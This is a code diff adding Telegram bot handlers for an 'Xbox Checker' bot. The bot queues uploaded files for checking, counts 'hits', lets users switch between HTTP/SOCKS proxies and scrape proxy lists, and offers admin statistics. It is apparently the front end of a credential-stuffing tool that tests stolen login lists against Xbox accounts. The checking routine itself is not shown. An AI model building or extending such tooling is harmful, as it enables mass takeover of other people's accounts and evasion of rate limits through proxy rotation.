+    user_id = message.from_user.id
+    file_id = message.document.file_id
+    file_name = message.document.file_name
+    status_msg = await message.answer(f"{EMOJIS['processing']} Downloading file...", parse_mode="HTML")
+    file_path = await download_file_safely(file_id, file_name)
+    
+    if not file_path:
+        await status_msg.edit_text("Failed to download file!")
+        return
+    
+    position = check_queue.add_to_queue(user_id, 'file_check', {'file_path': file_path}, message)
+    await status_msg.edit_text(f"File added to Queue! Position: #{position + 1}", parse_mode="HTML")
+
+@dp.message(Command("stats"))
+@dp.message(F.text == f"{EMOJIS['stats']} My Stats")
+async def menu_stats(message: types.Message):
+    user_id = message.from_user.id
+    user = db.get_user(user_id)
+    
+    total_checks = user.get('total_checks', 0)
+    hits = user.get('hits', 0)
+    efficiency = f"{(hits / total_checks * 100):.1f}%" if total_checks > 0 else "0%"
+    access_text = f"{EMOJIS['success']} Free & Unlimited"
+    
+    position = check_queue.get_queue_position(user_id)
+    queue_text = f"#{position}" if position else "No pending"
+    admin_tag = f" {EMOJIS['admin_user']} ADMIN" if is_admin(user_id) else ""
+    
+    user_proxy_type = user.get("proxy_type", "none")
+    user_proxy_count = len(user.get("proxies", []))
+    proxy_info = f"{EMOJIS['proxy']} {user_proxy_type.upper() if user_proxy_type != 'none' else 'None'} ({user_proxy_count})"
+    
+    stats_text = f"""{EMOJIS['stats']} <b>Your Statistics</b>{admin_tag}
+╔════════════════════════════════
+║ {EMOJIS['user']} <b>User:</b> {message.from_user.first_name}
+║ {EMOJIS['gem']} <b>ID:</b> {user_id}
+║ {EMOJIS['calendar']} <b>Joined:</b> {user.get('joined', 'N/A')[:10]}
+╠════════════════════════════════
+║ {EMOJIS['access']} <b>Access:</b> {access_text}
+║ {EMOJIS['stats']} <b>Total Checks:</b> {total_checks}
+║ 🎯 <b>Hits Found:</b> {hits}
+║ ⚡ <b>Efficiency:</b> {efficiency}
+╠════════════════════════════════
+║ {EMOJIS['proxy']} <b>Proxy:</b> {proxy_info}
+║ {EMOJIS['queue']} <b>Queue Position:</b> {queue_text}
+╚════════════════════════════════"""
+
+    await message.answer(stats_text, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")
+
+@dp.message(F.text == f"{EMOJIS['about']} About Bot")
+async def menu_about(message: types.Message):
+    await message.answer(f"Xbox Checker v{BOT_VERSION}\nOwner: {OWNER_USERNAME}", parse_mode="HTML")
+
+@dp.message(F.text == f"{EMOJIS['owner']} Owner")
+async def menu_owner(message: types.Message):
+    await message.answer(f"Owner: {OWNER_USERNAME}", parse_mode="HTML")
+
+@dp.message(F.text == f"{EMOJIS['admin']} Admin Panel")
+async def menu_admin_panel(message: types.Message):
+    if not is_admin(message.from_user.id):
+        return
+    await message.answer("Admin Panel:", reply_markup=get_admin_inline_menu(), parse_mode="HTML")
+
+@dp.message(F.text == f"{EMOJIS['proxy']} Proxy Settings")
+async def menu_proxy_settings(message: types.Message):
+    user_id = message.from_user.id
+    user = db.get_user(user_id)
+    await message.answer(f"Proxy Type: {user.get('proxy_type', 'none').upper()}", reply_markup=get_user_proxy_keyboard(user_id), parse_mode="HTML")
+
+@dp.message(F.text.startswith(f"{EMOJIS['http']} HTTP"))
+async def proxy_set_http_user(message: types.Message):
+    set_user_proxy_type(message.from_user.id, "http")
+    await message.answer("Proxy set to HTTP", reply_markup=get_user_proxy_keyboard(message.from_user.id))
+
+@dp.message(F.text.startswith(f"{EMOJIS['socks4']} SOCKS4"))
+async def proxy_set_socks4_user(message: types.Message):
+    set_user_proxy_type(message.from_user.id, "socks4")
+    await message.answer("Proxy set to SOCKS4", reply_markup=get_user_proxy_keyboard(message.from_user.id))
+
+@dp.message(F.text.startswith(f"{EMOJIS['socks5']} SOCKS5"))
+async def proxy_set_socks5_user(message: types.Message):
+    set_user_proxy_type(message.from_user.id, "socks5")
+    await message.answer("Proxy set to SOCKS5", reply_markup=get_user_proxy_keyboard(message.from_user.id))
+
+@dp.message(F.text.startswith(f"{EMOJIS['none']} None"))
+async def proxy_set_none_user(message: types.Message):
+    user_id = message.from_user.id
+    set_user_proxy_type(user_id, "none")
+    db.get_user(user_id)["proxies"] = []
+    db.save_all()
+    await message.answer("Proxy set to None", reply_markup=get_user_proxy_keyboard(user_id))
+
+@dp.message(F.text == f"{EMOJIS['scrape']} Scrape Proxies")
+async def proxy_scrape_user(message: types.Message):
+    user_id = message.from_user.id
+    status_msg = await message.answer("Scraping proxies...", parse_mode="HTML")
+    count = await asyncio.to_thread(scrape_user_proxies, user_id)
+    await status_msg.edit_text(f"Scraped {count} proxies!")
+
+@dp.message(F.text == f"{EMOJIS['status']} My Proxy Status")
+async def proxy_status_user(message: types.Message):
+    user = db.get_user(message.from_user.id)
+    await message.answer(f"Type: {user.get('proxy_type')}\nLoaded: {len(user.get('proxies', []))}", reply_markup=get_user_proxy_keyboard(message.from_user.id))
+
+@dp.message(F.text == f"{EMOJIS['back']} Back to Menu")
+async def proxy_back_to_menu_user(message: types.Message):
+    await message.answer("Main Menu", reply_markup=get_main_keyboard(message.from_user.id), parse_mode="HTML")
+
+@dp.callback_query(F.data == "menu_check")
+async def inline_check(callback: types.CallbackQuery):
+    await callback.answer()
+    await menu_check_account(callback.message)
+
+@dp.callback_query(F.data == "menu_file")
+async def inline_file(callback: types.CallbackQuery):
+    await callback.answer()
+    await menu_check_file(callback.message)
+
+@dp.callback_query(F.data == "menu_stats")
+async def inline_stats(callback: types.CallbackQuery):
+    await callback.answer()
+    await menu_stats(callback.message)
+
+@dp.callback_query(F.data == "menu_help")
+async def inline_help(callback: types.CallbackQuery):
+    await callback.answer()
+    await menu_about(callback.message)
+
+@dp.callback_query(F.data == "menu_owner")
+async def inline_owner(callback: types.CallbackQuery):
+    await callback.answer()
+    await menu_owner(callback.message)
+
+@dp.callback_query(F.data == "menu_queue")
+async def inline_queue(callback: types.CallbackQuery):
+    await callback.answer()
+    await menu_queue_status(callback.message)
+
+@dp.callback_query(F.data == "menu_back")
+async def inline_back(callback: types.CallbackQuery):
+    await callback.answer()
+    await callback.message.answer("Main Menu", reply_markup=get_main_keyboard(callback.from_user.id), parse_mode="HTML")
+
+@dp.callback_query(F.data == "admin_stats")
+async def admin_stats(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+    stats = db.get_stats()
+    await callback.message.edit_text(f"Total Users: {stats['total_users']}\nTotal Checks: {stats['total_checks']}\nTotal Hits: {stats['total_hits']}", reply_markup=get_admin_inline_menu(), parse_mode="HTML")
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_queue")
+async def admin_queue(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+    status = check_queue.get_queue_status()
+    await callback.message.edit_text(f"Queue Pending: {status['total']}", reply_markup=get_admin_inline_menu(), parse_mode="HTML")
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_users")
+async def admin_users(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+    await callback.message.edit_text(f"Total Database Users: {len(db.users)}", reply_markup=get_admin_inline_menu(), parse_mode="HTML")
+    await callback.answer()
+
+async def main():
+    print(f"{Fore.GREEN}✓ Starting queue processor...{Style.RESET_ALL}")
+    asyncio.create_task(process_queue())
+    print(f"{Fore.GREEN}✓ Bot is running (KeyError fixed!)...{Style.RESET_ALL}")
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    main()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\nStopped by user")
